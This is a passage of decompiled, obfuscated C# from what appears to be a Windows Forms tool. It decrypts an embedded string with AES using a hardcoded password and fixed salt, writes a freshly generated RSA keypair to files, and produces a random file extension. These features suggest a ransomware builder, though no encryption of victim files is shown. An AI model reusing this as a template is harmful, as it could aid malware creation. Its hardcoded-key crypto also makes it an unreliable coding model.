            RijndaelManaged rijndaelManaged = new RijndaelManaged();
            byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("ffRCWQdUOPAClUJZZPQmBjV", salt);
            rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
            rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
            MemoryStream memoryStream = new MemoryStream();
            CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
            object @string = default(object);
            try
            {
                byte[] array = Convert.FromBase64String(IHeCAieeFsugYXCFB);
                cryptoStream.Write(array, 0, array.Length);
                cryptoStream.Close();
                @string = Encoding.UTF8.GetString(memoryStream.ToArray());
                return @string;
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
                return @string;
            }
        }

        public string nkhju7027672294376573(int jnkhju70276, int yjnkhju70276722943)
        {
            Random random = new Random();
            string text = null;
            string text2 = "PQXWJMCGF&CXWQVXNJ&dguPQmBwCXWZ";
            checked
            {
                int num = random.Next(jnkhju70276 + 1, yjnkhju70276722943);
                for (int i = 1; i <= num; i++)
                {
                    int index = (int)Math.Round(Conversion.Int((float)(text2.Length - 2) * VBMath.Rnd()) + 1f);
                    text += Conversions.ToString(text2[index]);
                }
                string text3 = "CXWQVyxmWQdUOPAClUJZZPQmBwCXWQVkZ";
                return Conversions.ToString(text3[random.Next(0, text3.Length - 1)]) + text;
            }
        }
        private void fRCWQdUOPAClUJZZPQmd_Load_1(object sender, EventArgs e)
        {

        }

        private void Button2_Click(object sender, EventArgs e)
        {
            RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
            txt_Private.Text = Convert.ToBase64String(rSACryptoServiceProvider.ExportCspBlob(includePrivateParameters: true));
            txt_Public.Text = Convert.ToBase64String(rSACryptoServiceProvider.ExportCspBlob(includePrivateParameters: false));
            TextBox92.Text = txt_Public.Text;

            using (StreamWriter streamWriter = new StreamWriter(Application.StartupPath + "\\Public_key.txt"))
            {
                streamWriter.Write(txt_Public.Text);
            }

            using (StreamWriter streamWriter2 = new StreamWriter(Application.StartupPath + "\\Private_key.txt"))
            {
                streamWriter2.Write(txt_Private.Text);
            }
        }

        private void fRCWQdUOPAClUdJZZPgQm_Click(object sender, EventArgs e)
        {
            int try0001_dispatch = -1;
            int num3 = default(int);
            int num2 = default(int);
            int num = default(int);
            while (true)
            {
                try
                {
                    /*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/
                    ;
                    switch (try0001_dispatch)
                    {
                        default:
                            ProjectData.ClearProjectError();
                            num3 = -2;
                            break;
                        case 72:
                            {
                                num2 = num;
                                if (num3 > -2)
                                {
                                    switch (num3)
                                    {
                                        case 1:
                                            break;
                                        default:
                                            goto end_IL_0001;
                                    }
                                }
                                int num4 = num2 + 1;
                                num2 = 0;
                                switch (num4)
                                {
                                    case 1:
                                        break;
                                    case 2:
                                        goto end_IL_0001_2;
                                    default:
                                        goto end_IL_0001;
                                    case 3:
                                        goto end_IL_0001_3;
                                }
                                goto default;
                            }
                        end_IL_0001_2:
                            break;
                    }
                    num = 2;
                    nREJkHPJRmnREJkHPJRmaNnObVdOGNFCsSprVCsSprVvedQjVnf.Text = "." + nkhju7027672294376573(5, 10);
                    break;
                end_IL_0001:;
                }
                catch (Exception obj) when (obj is Exception && num3 != 0 && num2 == 0)
                {
                    ProjectData.SetProjectError((Exception)obj);
                    try0001_dispatch = 72;
                    continue;
                }
                throw ProjectData.CreateProjectError(-2146828237);
                continue;
            end_IL_0001_3:
                break;
            }
            if (num2 != 0)
            {
                ProjectData.ClearProjectError();
            }
        }
    }
}
